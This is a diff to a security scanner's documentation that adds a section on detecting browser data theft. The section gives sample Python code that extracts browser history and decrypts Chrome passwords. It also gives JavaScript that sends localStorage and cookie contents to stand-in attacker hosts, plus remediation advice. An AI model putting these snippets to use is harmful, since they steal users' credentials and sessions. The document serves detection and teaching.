@@ -1,3 +1,9 @@
+---
+layout: page
+title: Security Examples
+nav_order: 3
+---
+
 # Security Issues Detection Examples
 
 This document provides examples of common security issues that Insect can detect, along with explanations and remediation advice.
@@ -9,6 +15,7 @@ This document provides examples of common security issues that Insect can detect
 - [Shell Script Security Issues](#shell-script-security-issues)
 - [Configuration Security Issues](#configuration-security-issues)
 - [Secret Detection](#secret-detection)
+- [Browser Data Theft Detection](#browser-data-theft-detection)
 
 ## Python Security Issues
 
@@ -435,3 +442,219 @@ MIIEpAIBAAKCAQEA7bq/... [REDACTED] ...HwIDAQAB
 2. Store them securely in a key management service or environment variables
 3. Add key patterns to `.gitignore`
 4. Consider using a dedicated secrets management solution
+
+## Browser Data Theft Detection
+
+Insect can detect malicious code that attempts to steal sensitive browser data. This protection helps identify repositories that may be designed to harvest user information from web browsers.
+
+### Browser History and Cookies Access
+
+**Vulnerable Code:**
+
+```python
+import sqlite3
+import os
+
+def steal_browser_history():
+    # Malicious code accessing browser history
+    chrome_path = os.path.expanduser("~/.config/google-chrome/Default/History")
+    firefox_path = os.path.expanduser("~/.mozilla/firefox/*/places.sqlite")
+    
+    conn = sqlite3.connect(chrome_path)
+    cursor = conn.cursor()
+    cursor.execute("SELECT url, title, visit_count FROM urls")
+    return cursor.fetchall()
+```
+
+**What Insect Detects:**
+- Identifies access to browser history databases (`History`, `places.sqlite`)
+- Flags attempts to read browser cookies and cached data
+- Detects suspicious file path patterns targeting browser data directories
+
+**Why This is Dangerous:**
+- Browser history reveals user's browsing patterns and interests
+- Cookies may contain session tokens and authentication data
+- This information can be used for profiling, tracking, or account hijacking
+
+### Browser Password Extraction
+
+**Vulnerable Code:**
+
+```python
+import win32crypt
+import sqlite3
+import json
+
+def steal_chrome_passwords():
+    # Dangerous: Accessing Chrome login data
+    login_data_path = os.path.expanduser("~/AppData/Local/Google/Chrome/User Data/Default/Login Data")
+    
+    conn = sqlite3.connect(login_data_path)
+    cursor = conn.cursor()
+    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+    
+    for row in cursor.fetchall():
+        encrypted_password = row[2]
+        # Decrypt using Windows DPAPI
+        decrypted_password = win32crypt.CryptUnprotectData(encrypted_password)
+        print(f"Site: {row[0]}, User: {row[1]}, Password: {decrypted_password}")
+```
+
+**What Insect Detects:**
+- Identifies access to browser password databases (`Login Data`, `key4.db`, `logins.json`)
+- Flags use of password decryption functions (`CryptUnprotectData`)
+- Detects attempts to extract saved credentials from browser password managers
+
+**Why This is Critical:**
+- Exposes all saved passwords from the user's browser
+- Can lead to complete account compromise across multiple services
+- Violates user privacy and security expectations
+
+### Browser Storage Manipulation
+
+**Vulnerable Code:**
+
+```javascript
+// Malicious JavaScript to steal localStorage data
+function stealBrowserData() {
+    var stolenData = {};
+    
+    // Steal localStorage
+    for (var i = 0; i < localStorage.length; i++) {
+        var key = localStorage.key(i);
+        stolenData[key] = localStorage.getItem(key);
+    }
+    
+    // Steal sessionStorage
+    for (var i = 0; i < sessionStorage.length; i++) {
+        var key = sessionStorage.key(i);
+        stolenData[key] = sessionStorage.getItem(key);
+    }
+    
+    // Send stolen data to attacker server
+    fetch("http://malicious-server.com/steal", {
+        method: "POST",
+        body: JSON.stringify(stolenData)
+    });
+    
+    return stolenData;
+}
+```
+
+**What Insect Detects:**
+- Identifies suspicious localStorage/sessionStorage access patterns
+- Flags attempts to enumerate and extract browser storage data
+- Detects data exfiltration to external servers
+
+**Why This is Dangerous:**
+- Browser storage often contains authentication tokens and user preferences
+- Can be used to impersonate users or access their accounts
+- May contain sensitive application data
+
+### Browser Session Hijacking
+
+**Vulnerable Code:**
+
+```javascript
+function hijackSession() {
+    // Steal all cookies
+    var cookies = document.cookie;
+    
+    // Look for specific session tokens
+    var sessionToken = getCookie("JSESSIONID");
+    var phpSession = getCookie("PHPSESSID");
+    var aspSession = getCookie("ASP.NET_SessionId");
+    
+    // Send to attacker server
+    fetch("http://evil-server.com/collect", {
+        method: "POST",
+        body: JSON.stringify({
+            cookies: cookies,
+            tokens: {
+                jsession: sessionToken,
+                php: phpSession,
+                asp: aspSession
+            }
+        })
+    });
+}
+```
+
+**What Insect Detects:**
+- Identifies suspicious cookie access via `document.cookie`
+- Flags attempts to extract common session token formats
+- Detects patterns consistent with session hijacking attacks
+
+**Why This is Critical:**
+- Session tokens allow attackers to impersonate authenticated users
+- Can lead to account takeover without knowing passwords
+- Enables unauthorized access to user accounts and data
+
+### Browser Extension Manipulation
+
+**Vulnerable Code:**
+
+```javascript
+// Malicious extension injection
+function injectMaliciousExtension() {
+    // Access Chrome extension APIs
+    if (chrome.extension) {
+        chrome.extension.sendMessage({type: "steal_data"});
+    }
+    
+    // Install malicious extension programmatically
+    chrome.management.install({
+        url: "http://malicious-site.com/evil-extension.crx"
+    });
+}
+```
+
+**What Insect Detects:**
+- Identifies unauthorized browser extension API usage
+- Flags attempts to install or manipulate browser extensions
+- Detects suspicious extension communication patterns
+
+**Why This is Dangerous:**
+- Browser extensions have elevated privileges and access to user data
+- Malicious extensions can monitor all browsing activity
+- Can be used for persistent surveillance and data theft
+
+### Remediation Strategies
+
+**General Recommendations:**
+
+1. **Remove Browser Theft Code**: Immediately remove any code that accesses browser data without explicit user consent
+2. **Use Official APIs**: If legitimate browser interaction is needed, use official browser APIs and request proper permissions
+3. **Implement User Consent**: Always obtain explicit user consent before accessing any browser data
+4. **Follow Privacy Guidelines**: Adhere to privacy regulations and browser security policies
+5. **Regular Security Audits**: Regularly audit code for potential privacy violations
+
+**For Legitimate Browser Interaction:**
+
+```javascript
+// Example of legitimate browser storage usage
+function saveUserPreferences() {
+    // Only save data the user explicitly wants to store
+    const userSettings = {
+        theme: "dark",
+        language: "en"
+    };
+    
+    // Store with clear purpose and user consent
+    localStorage.setItem("userPreferences", JSON.stringify(userSettings));
+}
+
+function getUserPreferences() {
+    // Retrieve only the data your application stored
+    const preferences = localStorage.getItem("userPreferences");
+    return preferences ? JSON.parse(preferences) : null;
+}
+```
+
+**Security Best Practices:**
+
+1. **Minimal Data Access**: Only access the minimum data necessary for your application
+2. **Transparent Usage**: Clearly document what browser data your application accesses and why
+3. **Secure Transmission**: Use HTTPS for any data transmission
+4. **Data Minimization**: Don't store or transmit more data than necessary
+5. **User Control**: Provide users with options to view, modify, or delete stored data
